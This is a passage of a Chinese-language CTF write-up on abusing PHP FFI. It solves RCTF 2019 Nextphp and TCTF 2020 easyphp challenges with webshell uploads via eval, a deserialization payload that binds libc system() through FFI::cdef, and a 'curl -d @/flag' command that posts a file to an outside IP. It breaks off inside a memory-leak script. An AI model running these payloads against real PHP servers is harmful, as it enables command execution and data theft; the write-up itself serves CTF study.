+</span></span><span class=line><span class=cl><span class=nv>$libcurl</span> <span class=o>=</span> <span class=nx>FFI</span><span class=o>::</span><span class=na>load</span><span class=p>(</span><span class=s2>&#34;curl.h&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;https://www.laruence.com/2020/03/11/5475.html&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$tmpfile</span> <span class=o>=</span> <span class=s2>&#34;/tmp/tmpfile.out&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=nv>$ch</span> <span class=o>=</span> <span class=nv>$libcurl</span><span class=o>-&gt;</span><span class=na>curl_easy_init</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$fp</span> <span class=o>=</span> <span class=nv>$libc</span><span class=o>-&gt;</span><span class=na>fopen</span><span class=p>(</span><span class=nv>$tmpfile</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=nv>$libcurl</span><span class=o>-&gt;</span><span class=na>curl_easy_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_URL</span><span class=p>,</span> <span class=nv>$url</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$libcurl</span><span class=o>-&gt;</span><span class=na>curl_easy_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSL_VERIFYPEER</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$libcurl</span><span class=o>-&gt;</span><span class=na>curl_easy_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_WRITEDATA</span><span class=p>,</span> <span class=nv>$fp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$libcurl</span><span class=o>-&gt;</span><span class=na>curl_easy_perform</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=nv>$libcurl</span><span class=o>-&gt;</span><span class=na>curl_easy_cleanup</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=nv>$libc</span><span class=o>-&gt;</span><span class=na>fclose</span><span class=p>(</span><span class=nv>$fp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=nv>$ret</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$tmpfile</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=nv>$tmpfile</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=ffinew>FFI::new</h3><p><img src=/p/php-non-outbound-ffi/QQ20241110-133835.png width=1105 height=813 loading=lazy alt=1></p><p><code>FFI::new</code> 是 PHP FFI 提供的方法，用于在内存中创建一个新的 C 数据类型的实例。它的基本语法是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>FFI</span><span class=o>::</span><span class=na>new</span><span class=p>(</span><span class=s2>&#34;type&#34;</span><span class=p>,</span> <span class=p>[</span><span class=nx>bool</span> <span class=nv>$owned</span> <span class=o>=</span> <span class=k>true</span><span class=p>],</span> <span class=p>[</span><span class=nx>bool</span> <span class=nv>$persistent</span> <span class=o>=</span> <span class=k>false</span><span class=p>])</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>"type"</code>: 这是一个字符串，表示你想要创建的 C 数据类型，例如 <code>"int"</code>、<code>"float"</code>、<code>"char *"</code> 等。</li><li><code>$owned</code>: 可选参数，默认为 <code>true</code>。如果为 <code>true</code>，那么这个内存块会在其 PHP 变量被销毁时释放。</li><li><code>$persistent</code>: 可选参数，默认为 <code>false</code>。如果为 <code>true</code>，这个内存块在请求结束时不会被释放。</li></ul><p>那么写个demo</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>root</span><span class=o>@</span><span class=nx>dkhkKySag1YyfK</span><span class=o>:/</span><span class=nx>opt</span><span class=o>/</span><span class=nx>test</span><span class=c1># php test2.php
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>PHP</span> <span class=nx>Warning</span><span class=o>:</span>  <span class=nx>Module</span> <span class=s1>&#39;FFI&#39;</span> <span class=nx>already</span> <span class=nx>loaded</span> <span class=nx>in</span> <span class=nx>Unknown</span> <span class=nx>on</span> <span class=nx>line</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=nx>int</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nx>int</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nx>int</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里只简单说说这三种，还有很多师傅们自己拓展哦</p><h2 id=利用姿势>利用姿势</h2><h3 id=rctf-2019nextphp>[RCTF 2019]Nextphp</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>eval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>进来看到是这个，我们先写个木马进去，链接<code>antsword</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?a=file_put_contents(&#34;shell.php&#34;,&#39;木马内容自己写&#39;);
+</span></span></code></pre></td></tr></table></div></div><p>进来之后拿到了这个<code>preload.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>final</span> <span class=k>class</span> <span class=nc>A</span> <span class=k>implements</span> <span class=nx>Serializable</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=nv>$data</span> <span class=o>=</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;ret&#39;</span> <span class=o>=&gt;</span> <span class=k>null</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;func&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;print_r&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;arg&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;1&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>run</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>[</span><span class=s1>&#39;ret&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>[</span><span class=s1>&#39;func&#39;</span><span class=p>](</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>[</span><span class=s1>&#39;arg&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>__serialize</span><span class=p>()</span><span class=o>:</span> <span class=k>array</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>__unserialize</span><span class=p>(</span><span class=k>array</span> <span class=nv>$data</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>array_merge</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>run</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>serialize</span> <span class=p>()</span><span class=o>:</span> <span class=nx>string</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>unserialize</span><span class=p>(</span><span class=nv>$payload</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$payload</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>run</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span> <span class=p>(</span><span class=nv>$key</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>[</span><span class=nv>$key</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__set</span> <span class=p>(</span><span class=nv>$key</span><span class=p>,</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=nx>\Exception</span><span class=p>(</span><span class=s1>&#39;No implemented&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=nx>\Exception</span><span class=p>(</span><span class=s1>&#39;No implemented&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><blockquote><p>PHP Serializable是自定义序列化的接口。实现此接口的类将不再支持__sleep()和__wakeup()。</p><p>当类的实例对象被序列化时将自动调用serialize方法，并且不会调用 __construct()或有其他影响。如果对象实现理Serialize接口，接口的serialize()方法将被忽略，并使用__serialize()代替。</p><p>当类的实例对象被反序列化时，将调用unserialize()方法，并且不执行__destruct()。如果对象实现理Serialize接口，接口的unserialize()方法将被忽略，并使用__unserialize()代替。</p></blockquote><p>我们先调试一下序列化的情况可以看到直接就走到了<code>__serialize()</code></p><p><img src=/p/php-non-outbound-ffi/QQ20241110-143151.png width=1739 height=1090 loading=lazy alt=1></p><p>就跳出来了，再看看反序列化的情况，可以看到是直接跳到了<code>__unserialize()</code></p><p><img src=/p/php-non-outbound-ffi/QQ20241110-143400.png width=1974 height=1195 loading=lazy alt=1></p><p>此时我们如果注释这两个方法的话，进行调试看看呢，可以看到就是走的<code>serialize</code>和<code>unserialize</code>，嗯，那么我们看看怎么利用FFI来打这个，首先要触发反序列化，那么我们就要走<code>unserialize</code>，那么写个<code>exp</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>final</span> <span class=k>class</span> <span class=nc>A</span> <span class=k>implements</span> <span class=nx>Serializable</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=nv>$data</span> <span class=o>=</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;ret&#39;</span> <span class=o>=&gt;</span> <span class=k>null</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;func&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;FFI::cdef&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;arg&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;int system(const char *command);&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>serialize</span> <span class=p>()</span><span class=o>:</span> <span class=nx>string</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>unserialize</span><span class=p>(</span><span class=nv>$payload</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$payload</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>A</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后我们再调用<code>__serialize()</code>方法来返回执行结果，这里是外带flag，payload是这样子</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>?</span><span class=n>a</span><span class=o>=$</span><span class=n>a</span><span class=o>=</span><span class=n>unserialize</span><span class=p>(</span><span class=s1>&#39;C:1:&#34;A&#34;:95:{a:3:{s:3:&#34;ret&#34;;N;s:4:&#34;func&#34;;s:9:&#34;FFI::cdef&#34;;s:3:&#34;arg&#34;;s:32:&#34;int system(const char *command);&#34;;}}&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>__serialize</span><span class=p>()[</span><span class=s1>&#39;ret&#39;</span><span class=p>]</span><span class=o>-&gt;</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;curl -d @/flag 27.25.151.48:9999&#39;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>可能晕的地方就是命令执行这里其实</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=p>[</span><span class=s1>&#39;ret&#39;</span><span class=p>]</span><span class=o>-&gt;</span><span class=na>system</span><span class=p>(</span><span class=s1>&#39;curl -d @/flag 27.25.151.48:9999&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1># 这个和下面是一样的
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$ffi</span> <span class=o>=</span> <span class=nx>FFI</span><span class=o>::</span><span class=na>cdef</span><span class=p>(</span><span class=s2>&#34;int system(const char *command);&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$ffi</span><span class=o>-&gt;</span><span class=na>system</span><span class=p>(</span><span class=s2>&#34;curl -d @/flag 27.25.151.48:8888&#34;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=tctf-2020-easyphp>TCTF 2020 easyphp</h3><p>进来之后还是经典的东西</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GEt</span><span class=p>[</span><span class=s1>&#39;rh&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>    <span class=k>eval</span><span class=p>(</span><span class=nv>$_GEt</span><span class=p>[</span><span class=s1>&#39;rh&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>可以直接phpinfo看到一些信息但是都不重要重要的是，我们先写马一样的方法，然后链接antsword，这里我们也得到了信息是<strong>php7.4.5</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$file_list</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$it</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DirectoryIterator</span><span class=p>(</span><span class=s2>&#34;glob:///*&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$it</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>){</span>
+</span></span><span class=line><span class=cl><span class=nv>$file_list</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$f</span><span class=o>-&gt;</span><span class=na>__toString</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$it</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DirectoryIterator</span><span class=p>(</span><span class=s2>&#34;glob:///.*&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$it</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>){</span>
+</span></span><span class=line><span class=cl><span class=nv>$file_list</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$f</span><span class=o>-&gt;</span><span class=na>__toString</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nx>sort</span><span class=p>(</span><span class=nv>$file_list</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$file_list</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$f</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>我们先利用原生类读取根目录发现一个<code>flag.h</code>和<code>flag.so</code>，那么看了之前的知识点很容易想到用FFI来加载h文件达到目的，进antsword看看h文件里面写了什么</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>var_dump</span><span class=p>(</span><span class=n>file_get_contents</span><span class=p>(</span><span class=s2>&#34;/flag.h&#34;</span><span class=p>));</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/php-non-outbound-ffi/QQ20241110-162320.png width=588 height=522 loading=lazy alt=1></p><p>直接调用就可以了，写个exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$ffi</span><span class=o>=</span><span class=nx>FFI</span><span class=o>::</span><span class=na>load</span><span class=p>(</span><span class=s2>&#34;/flag.h&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=nv>$ffi</span><span class=o>-&gt;</span><span class=na>flag_fUn3t1on_fFi</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>FFI</span><span class=o>::</span><span class=na>string</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
+</span></span></code></pre></td></tr></table></div></div><p>就好了</p><h3 id=noeasyphprevenge>noeasyphp(revenge)</h3><p>不过刚才那一道好像是非预期了，不会让我们那么容易拿到flag</p><p>还是写马然后看目录</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>var_dump</span><span class=p>(</span><span class=n>scandir</span><span class=p>(</span><span class=s1>&#39;glob:///*&#39;</span><span class=p>));</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后拿到了<code>flag.h</code>和<code>flag.so</code>，但是没有函数让我们看函数名了</p><p>查找FFI官方文档会发现有很多与内存有很多相关的函数，我们这里使用内存泄露来获取函数名</p><p>exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>params</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;rh&#34;</span><span class=p>:</span><span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>try {
+</span></span></span><span class=line><span class=cl><span class=s1>$ffi=FFI::load(&#34;/flag.h&#34;);
+</span></span></span><span class=line><span class=cl><span class=s1>//get flag
+</span></span></span><span class=line><span class=cl><span class=s1>//$a = $ffi-&gt;flag_wAt3_uP_apA3H1();
+</span></span></span><span class=line><span class=cl><span class=s1>//for($i = 0; $i &lt; 128; $i++){
+</span></span></span><span class=line><span class=cl><span class=s1>echo $a[$i];
+</span></span></span><span class=line><span class=cl><span class=s1>//}
+</span></span></span><span class=line><span class=cl><span class=s1>$a = $ffi-&gt;new(&#34;char[8]&#34;, false);
+</span></span></span><span class=line><span class=cl><span class=s1>$a[0] = &#39;f&#39;;
+</span></span></span><span class=line><span class=cl><span class=s1>$a[1] = &#39;l&#39;;
+</span></span></span><span class=line><span class=cl><span class=s1>$a[2] = &#39;a&#39;;
+</span></span></span><span class=line><span class=cl><span class=s1>$a[3] = &#39;g&#39;;
+</span></span></span><span class=line><span class=cl><span class=s1>$a[4] = &#39;f&#39;;
+</span></span></span><span class=line><span class=cl><span class=s1>$a[5] = &#39;l&#39;;
+</span></span></span><span class=line><span class=cl><span class=s1>$a[6] = &#39;a&#39;;
+</span></span></span><span class=line><span class=cl><span class=s1>$a[7] = &#39;g&#39;;
+</span></span></span><span class=line><span class=cl><span class=s1>$b = $ffi-&gt;new(&#34;char[8]&#34;, false);
+</span></span></span><span class=line><span class=cl><span class=s1>$b[0] = &#39;f&#39;;
+</span></span></span><span class=line><span class=cl><span class=s1>$b[1] = &#39;l&#39;;
+</span></span></span><span class=line><span class=cl><span class=s1>$b[2] = &#39;a&#39;;
